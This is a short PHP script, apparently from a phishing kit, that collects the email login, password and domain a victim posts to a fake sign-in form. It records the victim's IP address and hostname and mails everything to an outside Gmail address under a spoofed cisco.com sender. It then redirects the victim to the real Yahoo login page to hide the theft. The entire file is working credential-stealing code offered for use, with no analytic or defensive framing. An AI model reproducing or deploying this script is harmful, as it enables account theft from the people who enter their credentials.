<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message  = "==================+[ Able God ]+==================\n";
$message .= "Email Address       : ".$_POST['login']."\n";
$message .= "Password    : ".$_POST['passwd']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Domain      : ".$_POST['domain']."\n";

$message .= "=============+ [ Able God ] +=============\n";

$send= "gunylee101@gmail.com";

$subject = "Wire-Continue! | logins | $ip";
$headers = "From:  Lukmon<ahmednasir@cisco.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);

header("Location: http://login.yahoo.com/");
?>